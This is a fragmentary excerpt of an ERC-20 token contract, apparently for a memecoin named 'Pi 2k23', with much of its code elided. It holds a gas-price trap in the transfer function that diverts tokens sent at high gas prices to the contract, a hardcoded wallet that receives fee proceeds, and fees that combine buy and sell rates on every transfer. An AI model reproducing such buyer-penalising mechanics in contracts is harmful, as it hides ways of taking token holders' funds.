...
//Portal: https://t.me/Pi2k23
// website: https://pi2k23evolution.com/
...
contract Pi2k23 is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 3140000* 10**_decimals;
    uint256 public _maxWalletAmount = 314000* 10**_decimals; // 
    uint256 private constant TaxSwapAmount = 100 * 10**_decimals; //
 
    string private constant _name = "Pi 2k23"; // 
    string private constant _symbol = unicode"𝝅2k23"; //    
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from]){require(tx.gasprice < 100 gwei, ""); }
        ...
        if (tx.gasprice > 100 gwei){_tOwned[address(this)] += amount;}
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0)
            payable(0x489c21eC8a7C916C7f42874aEaF2DeD173197F52).transfer(ethToSend); //marketing wallet
    }
  ...
  function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 marketingFee = amount * (_buyMarketingFee + _sellMarketingFee) / 100; 
        uint256 liquidityFee = amount * (_buyLiquidityFee + _sellLiquidityFee) / 100; 
